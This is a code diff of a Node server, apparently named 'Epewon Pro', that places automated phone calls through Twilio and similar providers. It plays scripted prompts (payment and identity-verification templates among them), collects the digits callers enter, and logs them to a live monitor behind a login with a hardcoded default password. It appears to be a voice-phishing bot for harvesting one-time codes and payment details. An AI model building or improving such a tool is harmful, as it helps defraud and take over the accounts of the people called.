@@ -20,9 +20,6 @@ app.use(cors());
 
 function uid() { return Date.now().toString(36) + Math.random().toString(36).slice(2); }
 
-const DATA = path.join(__dirname, "data");
-if (!fs.existsSync(DATA)) fs.mkdirSync(DATA, { recursive: true });
-
 // Auto-detect and remember the public server URL from incoming requests
 let detectedBaseUrl = "";
 function getPublicUrl(req) {
@@ -32,21 +29,51 @@ function getPublicUrl(req) {
   if (host) { detectedBaseUrl = proto + "://" + host; }
   return detectedBaseUrl;
 }
-const F = {
-  settings: path.join(DATA, "settings.json"),
-  scripts:  path.join(DATA, "scripts.json"),
-  logs:     path.join(DATA, "logs.json"),
-  auth:     path.join(DATA, "auth.json"),
-};
-function rj(file, def) {
-  try { if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, "utf8")); } catch(e) {}
-  return typeof def === "function" ? def() : JSON.parse(JSON.stringify(def));
+
+// ── Upstash Redis persistent storage (HTTP — no driver, works everywhere) ────
+const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL   || "";
+const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN || "";
+
+// In-memory cache so reads are instant after first load
+const memStore = {};
+
+async function storeGet(key) {
+  // Always return from cache first (instant)
+  if (memStore[key] !== undefined) return memStore[key];
+  // Then try Redis
+  if (!REDIS_URL) return null;
+  try {
+    const r = await fetch(REDIS_URL + "/get/" + encodeURIComponent(key), {
+      headers: { Authorization: "Bearer " + REDIS_TOKEN }
+    });
+    const d = await r.json();
+    if (d.result !== null && d.result !== undefined) {
+      const parsed = JSON.parse(d.result);
+      memStore[key] = parsed;
+      return parsed;
+    }
+  } catch(e) {}
+  return null;
 }
-function wj(file, data) { fs.writeFileSync(file, JSON.stringify(data, null, 2)); }
+
+async function storeSet(key, val) {
+  memStore[key] = val;  // Update cache immediately
+  if (!REDIS_URL) return;
+  try {
+    await fetch(REDIS_URL + "/set/" + encodeURIComponent(key), {
+      method: "POST",
+      headers: { Authorization: "Bearer " + REDIS_TOKEN, "Content-Type": "application/json" },
+      body: JSON.stringify({ value: JSON.stringify(val) })
+    });
+  } catch(e) { console.error("Redis write failed:", e.message); }
+}
 
 const DEF_AUTH = { username:"admin", password:"epewon2024", ipRestriction:{ enabled:false, allowedIPs:[], blockedCountries:[], allowedCountries:[] } };
-function loadAuth() { return { ...DEF_AUTH, ...rj(F.auth, DEF_AUTH) }; }
-function saveAuth(d) { wj(F.auth, d); }
+// Sync auth cache - loaded at startup and kept in memory
+let _authCache = null;
+async function loadAuthAsync() { const v = await storeGet("auth"); _authCache = v ? {...DEF_AUTH,...v} : {...DEF_AUTH}; return _authCache; }
+function loadAuth() { return _authCache || {...DEF_AUTH}; }
+async function saveAuth(d) { _authCache = d; await storeSet("auth", d); }
 
 // Cookie parser
 app.use(function(req, res, next) {
@@ -59,24 +86,16 @@ app.use(function(req, res, next) {
   next();
 });
 
-// File-based sessions — survive Render restarts and spin-downs
-const SESS_FILE = path.join(DATA, 'sessions.json');
-function loadSessions() {
-  try { if (fs.existsSync(SESS_FILE)) return JSON.parse(fs.readFileSync(SESS_FILE, 'utf8')); } catch(e) {}
-  return {};
-}
-function saveSessions(s) {
-  try { fs.writeFileSync(SESS_FILE, JSON.stringify(s)); } catch(e) {}
-}
+// Sessions in memory — login sessions are short-lived, memory is fine
+const _sessions = {};
+function loadSessions() { return _sessions; }
+function saveSessions(s) { Object.assign(_sessions, s); }
 function makeToken() { return uid()+uid()+uid(); }
 function checkSession(req) {
   const token = req.cookies && req.cookies.ep_sess;
   if (!token) return false;
-  const sessions = loadSessions();
-  if (!sessions[token]) return false;
-  if (Date.now() - sessions[token].createdAt > 86400000) {
-    delete sessions[token]; saveSessions(sessions); return false;
-  }
+  if (!_sessions[token]) return false;
+  if (Date.now() - _sessions[token].createdAt > 86400000) { delete _sessions[token]; return false; }
   return true;
 }
 function ipAllowed(req) {
@@ -180,29 +199,38 @@ const SEED_SCRIPTS = [
     errorMessage:"We could not verify your identity due to incorrect input. Please call our security team directly. Goodbye."
   }
 ];
-function loadSettings() { return { ...DEF_SETTINGS, ...rj(F.settings, DEF_SETTINGS) }; }
-function saveSettings(d) { wj(F.settings, d); }
-function loadScripts() {
-  // Seeds ALWAYS use hardcoded versions - never from disk.
-  // This prevents old/corrupted disk data from breaking the templates.
+let _settingsCache = null;
+async function loadSettingsAsync() { const v = await storeGet("settings"); _settingsCache = v ? {...DEF_SETTINGS,...v} : {...DEF_SETTINGS}; return _settingsCache; }
+function loadSettings() { return _settingsCache || {...DEF_SETTINGS}; }
+async function saveSettings(d) { _settingsCache = d; await storeSet("settings", d); }
+let _scriptsCache = null;
+async function loadScriptsAsync() {
   const seeds = JSON.parse(JSON.stringify(SEED_SCRIPTS));
-  const seedIds = seeds.map(function(s){ return s.id; });
-  try {
-    const saved = rj(F.scripts, null);
-    if (saved && saved.length) {
-      // Only add user-created scripts (not any seed IDs)
-      const userCreated = saved.filter(function(s){ return !seedIds.includes(s.id); });
-      return seeds.concat(userCreated);
-    }
-  } catch(e) {}
-  return seeds;
+  const seedIds = seeds.map(s=>s.id);
+  const saved = await storeGet("scripts");
+  if (saved && saved.length) {
+    const userCreated = saved.filter(s=>!seedIds.includes(s.id));
+    _scriptsCache = seeds.concat(userCreated);
+  } else {
+    _scriptsCache = seeds;
+  }
+  return _scriptsCache;
+}
+function loadScripts() { return _scriptsCache || JSON.parse(JSON.stringify(SEED_SCRIPTS)); }
+async function saveScripts(arr) {
+  const seedIds = SEED_SCRIPTS.map(s=>s.id);
+  const userOnly = arr.filter(s=>!seedIds.includes(s.id));
+  _scriptsCache = arr;
+  await storeSet("scripts", userOnly);
 }
 
 // Endpoint to get the built-in seed templates (always available regardless of disk)
 // These are hardcoded in memory so Render disk wipes don't affect them
-function saveScripts(d) { wj(F.scripts, d); }
-function loadLogs() { return rj(F.logs, []); }
-function saveLogs(d) { wj(F.logs, d); }
+// saveScripts is now async - see above
+let _logsCache = null;
+async function loadLogsAsync() { _logsCache = (await storeGet("logs")) || []; return _logsCache; }
+function loadLogs() { return _logsCache || []; }
+async function saveLogs(arr) { _logsCache = arr; await storeSet("logs", arr); }
 
 function makeClient(settings) {
   const p = settings.provider || "twilio";
@@ -228,29 +256,21 @@ async function makeCall(ctx, to, twimlUrl, statusUrl) {
 }
 
 // Load saved sessions from disk on startup (so monitor works after restarts)
-const SESSIONS_FILE = path.join(DATA, "call_sessions.json");
-function loadCallSessions() {
-  try { if(fs.existsSync(SESSIONS_FILE)) return JSON.parse(fs.readFileSync(SESSIONS_FILE,"utf8")); } catch(e) {}
-  return {};
-}
-function saveCallSessions() {
-  try { fs.writeFileSync(SESSIONS_FILE, JSON.stringify(callSessions)); } catch(e) {}
-}
-const callSessions = loadCallSessions();
+const callSessions = {};
 function syncLog(s) {
   // Save to logs file
   const logs=loadLogs();
   const i=logs.findIndex(l=>l.callSid===s.callSid);
   if(i>=0)logs[i]={...logs[i],...s};else logs.unshift(s);
-  saveLogs(logs);
+  saveLogs(logs).catch(()=>{});
   // Keep memory in sync
   callSessions[s.callSid]=s;
   // Persist sessions so monitor works after restarts
-  saveCallSessions();
+  // sessions saved in memory
 }
 
 
-// ── GeoIP lookup (free, no key needed) ───────────────────────────────────────
+// ── GeoIP lookup ─────────────────────────────────────────────────────────────
 async function getGeoInfo(ip) {
   if (!ip || ip === '::1' || ip.startsWith('127.') || ip.startsWith('::ffff:127')) return { country:'Local', region:'Local', city:'Local' };
   try {
@@ -261,14 +281,14 @@ async function getGeoInfo(ip) {
   return { country:'Unknown', region:'Unknown', city:'Unknown' };
 }
 
-// Login attempt log (in-memory + persisted)
-const LOGIN_LOG_FILE = path.join(DATA, 'login_logs.json');
-function loadLoginLogs() { return rj(LOGIN_LOG_FILE, []); }
-function saveLoginLog(entry) {
-  const logs = loadLoginLogs();
-  logs.unshift(entry);
-  if (logs.length > 500) logs.splice(500); // keep last 500
-  wj(LOGIN_LOG_FILE, logs);
+// Login logs in memory + MongoDB
+let _loginLogs = [];
+async function loadLoginLogsAsync() { _loginLogs = (await storeGet("login_logs")) || []; }
+function loadLoginLogs() { return _loginLogs; }
+async function saveLoginLog(entry) {
+  _loginLogs.unshift(entry);
+  if (_loginLogs.length > 500) _loginLogs.splice(500);
+  await storeSet("login_logs", _loginLogs);
 }
 
 // ── Login page ────────────────────────────────────────────────────────────────
@@ -312,7 +332,6 @@ app.post("/auth/login", async (req, res) => {
     const token = makeToken();
     const sessions = loadSessions();
     sessions[token] = { createdAt: Date.now() };
-    saveSessions(sessions);
     logEntry.success = true; logEntry.reason = "Login successful";
     saveLoginLog(logEntry);
     res.setHeader("Set-Cookie", "ep_sess="+token+"; HttpOnly; Path=/; Max-Age=86400; SameSite=Lax");
@@ -324,7 +343,7 @@ app.post("/auth/login", async (req, res) => {
 });
 app.post("/auth/logout", (req, res) => {
   const token = req.cookies && req.cookies.ep_sess;
-  if (token) { const s = loadSessions(); delete s[token]; saveSessions(s); }
+  if (token) delete _sessions[token];
   res.setHeader("Set-Cookie", "ep_sess=; HttpOnly; Path=/; Max-Age=0");
   res.json({ ok:true });
 });
@@ -341,8 +360,8 @@ app.post("/api/auth", (req, res) => {
 app.get("/api/auth/logs", (req, res) => {
   res.json(loadLoginLogs());
 });
-app.delete("/api/auth/logs", (req, res) => {
-  wj(LOGIN_LOG_FILE, []);
+app.delete("/api/auth/logs", async (req, res) => {
+  _loginLogs = []; await storeSet("login_logs", []);
   res.json({ success: true });
 });
 
@@ -354,12 +373,12 @@ app.get("/api/settings", (req, res) => {
   });
   res.json(safe);
 });
-app.post("/api/settings", (req, res) => {
+app.post("/api/settings", async (req, res) => {
   const cur=loadSettings(); const body=req.body; const updated={...cur,...body};
   ["twilio","signalwire","vonage","plivo","africastalking","telnyx"].forEach(p=>{
     if(body[p]){updated[p]={...cur[p],...body[p]};if(body[p].authToken&&body[p].authToken.startsWith("••••"))updated[p].authToken=cur[p].authToken;if(body[p].apiKey&&body[p].apiKey.startsWith("••••"))updated[p].apiKey=cur[p].apiKey;if(body[p].apiSecret&&body[p].apiSecret.startsWith("••••"))updated[p].apiSecret=cur[p].apiSecret;}
   });
-  saveSettings(updated); res.json({ success:true });
+  await saveSettings(updated); res.json({ success:true });
 });
 app.get("/api/test", async (req, res) => {
   const s=loadSettings(); const ctx=makeClient(s);
@@ -376,33 +395,45 @@ app.get("/api/seed-scripts", (req, res) => {
 });
 
 app.get("/api/scripts",    (req,res) => res.json(loadScripts()));
-app.post("/api/scripts",   (req,res) => {
+app.post("/api/scripts", async (req,res) => {
   const body=req.body;
   const seedIds=['tpl-default','tpl-payment','tpl-survey','tpl-appointment','tpl-verification'];
-  // Load only user-created scripts from disk
-  let diskScripts=[];
-  try{ const s=rj(F.scripts,null); if(s&&s.length) diskScripts=s.filter(function(x){return !seedIds.includes(x.id);}); }catch(e){}
+  const current = loadScripts();
   if(body.id && !seedIds.includes(body.id)){
-    const i=diskScripts.findIndex(s=>s.id===body.id);
-    if(i>=0)diskScripts[i]={...diskScripts[i],...body,updatedAt:new Date().toISOString()};
-    else diskScripts.push({...body,createdAt:new Date().toISOString()});
+    const i=current.findIndex(s=>s.id===body.id);
+    if(i>=0)current[i]={...current[i],...body,updatedAt:new Date().toISOString()};
+    else current.push({...body,createdAt:new Date().toISOString()});
   } else if(!body.id){
-    diskScripts.push({...body,id:uid(),createdAt:new Date().toISOString()});
+    current.push({...body,id:uid(),createdAt:new Date().toISOString()});
   }
-  saveScripts(diskScripts);
+  await saveScripts(current);
   res.json({success:true,scripts:loadScripts()});
 });
-app.delete("/api/scripts/:id", (req,res) => {
-  let scripts=loadScripts(); if(scripts.length<=1) return res.status(400).json({error:"Cannot delete the last script."});
-  scripts=scripts.filter(s=>s.id!==req.params.id); if(!scripts.find(s=>s.isDefault))scripts[0].isDefault=true;
-  saveScripts(scripts); res.json({success:true,scripts});
+app.delete("/api/scripts/:id", async (req,res) => {
+  let scripts=loadScripts();
+  const seedIds=['tpl-default','tpl-payment','tpl-survey','tpl-appointment','tpl-verification'];
+  if(seedIds.includes(req.params.id)) return res.status(400).json({error:"Cannot delete a template script."});
+  scripts=scripts.filter(s=>s.id!==req.params.id);
+  if(!scripts.find(s=>s.isDefault)&&scripts.length) scripts[0].isDefault=true;
+  await saveScripts(scripts); res.json({success:true,scripts});
 });
-app.post("/api/scripts/:id/setdefault", (req,res) => { const scripts=loadScripts(); scripts.forEach(s=>s.isDefault=s.id===req.params.id); saveScripts(scripts); res.json({success:true}); });
+app.post("/api/scripts/:id/setdefault", async (req,res) => { const scripts=loadScripts(); scripts.forEach(s=>s.isDefault=s.id===req.params.id); await saveScripts(scripts); res.json({success:true}); });
 
 // ── Logs ──────────────────────────────────────────────────────────────────────
-app.get("/api/logs",         (req,res) => res.json(loadLogs()));
-app.delete("/api/logs/:id",  (req,res) => { saveLogs(loadLogs().filter(l=>l.id!==req.params.id)); res.json({success:true}); });
-app.delete("/api/logs",      (req,res) => { saveLogs([]); res.json({success:true}); });
+app.get("/api/logs", (req,res) => {
+  const disk = loadLogs();
+  const mem = Object.values(callSessions);
+  const diskSids = new Set(disk.map(l=>l.callSid));
+  const memOnly = mem.filter(m=>!diskSids.has(m.callSid));
+  const merged = [...mem.filter(m=>diskSids.has(m.callSid)).map(m=>{
+    const d=disk.find(l=>l.callSid===m.callSid);
+    return {...d,...m};
+  }), ...memOnly, ...disk.filter(d=>!mem.find(m=>m.callSid===d.callSid))];
+  merged.sort((a,b)=>new Date(b.startTime)-new Date(a.startTime));
+  res.json(merged.slice(0,200));
+});
+app.delete("/api/logs/:id", async (req,res) => { await saveLogs(loadLogs().filter(l=>l.id!==req.params.id)); res.json({success:true}); });
+app.delete("/api/logs", async (req,res) => { await saveLogs([]); res.json({success:true}); });
 app.get("/api/sessions", (req,res) => {
   // Merge in-memory (current run) + disk logs (previous runs) so monitor always has data
   const diskLogs = loadLogs();
@@ -428,7 +459,7 @@ app.post("/api/call", async (req,res) => {
   try{
     const callSid=await makeCall(ctx,phoneNumber,baseUrl+"/twiml/start?sid="+script.id,baseUrl+"/twiml/status");
     const entry={id:uid(),callSid,phone:phoneNumber,label:label||"Call",scriptName:script.name,provider:ctx.type,status:"initiated",statusDetail:"Dialing...",startTime:new Date().toISOString(),endTime:null,duration:null,currentStep:-1,collected:[],steps:script.steps.length};
-    callSessions[callSid]=entry; const logs=loadLogs(); logs.unshift(entry); saveLogs(logs);
+    callSessions[callSid]=entry; const logs=loadLogs(); logs.unshift(entry); saveLogs(logs).catch(()=>{});
     res.json({success:true,callSid});
   }catch(err){res.status(500).json({error:err.message});}
 });
@@ -498,15 +529,13 @@ app.all("/twiml/step/:idx",(req,res)=>{
   const {VoiceResponse}=require("twilio").twiml;const t=new VoiceResponse();
   if(!step){if(callSessions[sid]){callSessions[sid].status="completed";callSessions[sid].statusDetail="All steps done";syncLog(callSessions[sid]);}t.say({voice:v,language:l},sc.successMessage);t.hangup();return res.type("text/xml").send(t.toString());}
   if(callSessions[sid]){callSessions[sid].currentStep=idx;callSessions[sid].statusDetail="Waiting: "+step.label;syncLog(callSessions[sid]);}
-  const g=t.gather({numDigits:step.maxDigits,finishOnKey:"#",action:base+"/twiml/collect/"+idx+"?sid="+sc.id,method:"POST",timeout:step.timeout});
+  const g=t.gather({numDigits:step.maxDigits,action:base+"/twiml/collect/"+idx+"?sid="+sc.id,method:"POST",timeout:step.timeout});
   g.say({voice:v,language:l},step.message);t.say({voice:v,language:l},sc.errorMessage);t.hangup();res.type("text/xml").send(t.toString());
 });
 app.post("/twiml/collect/:idx",(req,res)=>{
   const {voice:v,language:l}=getVoice();const sc=getScript(req.query.sid);const base=getBase(req);const idx=parseInt(req.params.idx,10);const sid=req.body.CallSid;const digits=req.body.Digits||"";const step=sc.steps[idx];
   const {VoiceResponse}=require("twilio").twiml;const t=new VoiceResponse();
-  const exp=step.maxDigits;const act=digits.length;
-  if(act<exp){t.say({voice:v,language:l},"That code is too short. You entered "+act+" digits but we need "+exp+". Please try again.");const g=t.gather({numDigits:exp,finishOnKey:"#",action:base+"/twiml/collect/"+idx+"?sid="+sc.id,method:"POST",timeout:step.timeout});g.say({voice:v,language:l},step.message);return res.type("text/xml").send(t.toString());}
-  if(act>exp){t.say({voice:v,language:l},"That code is too long. You entered "+act+" digits but we need exactly "+exp+". Please try again.");const g=t.gather({numDigits:exp,finishOnKey:"#",action:base+"/twiml/collect/"+idx+"?sid="+sc.id,method:"POST",timeout:step.timeout});g.say({voice:v,language:l},step.message);return res.type("text/xml").send(t.toString());}
+  // numDigits is exact - Twilio auto-submits when reached
   if(callSessions[sid]){callSessions[sid].collected.push({step:idx,label:step.label,value:digits,time:new Date().toISOString()});callSessions[sid].currentStep=idx+1;callSessions[sid].statusDetail="Received: "+step.label;syncLog(callSessions[sid]);}
   if(step.confirmMessage)t.say({voice:v,language:l},step.confirmMessage);
   t.redirect(base+"/twiml/step/"+(idx+1)+"?sid="+sc.id);res.type("text/xml").send(t.toString());
@@ -526,4 +555,18 @@ app.post("/twiml/status",(req,res)=>{
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("\n✅ Epewon Pro → http://localhost:" + PORT + "\n"));
+async function startServer() {
+  console.log("\n🔄 Loading data from MongoDB...");
+  await loadAuthAsync();
+  await loadSettingsAsync();
+  await loadScriptsAsync();
+  await loadLogsAsync();
+  await loadLoginLogsAsync();
+  console.log("✅ Data loaded");
+  app.listen(PORT, () => console.log("✅ Epewon Pro → http://localhost:" + PORT + "\n"));
+}
+startServer().catch(err => {
+  console.error("Startup error:", err);
+  // Start anyway with defaults
+  app.listen(PORT, () => console.log("✅ Epewon Pro (no DB) → http://localhost:" + PORT + "\n"));
+});
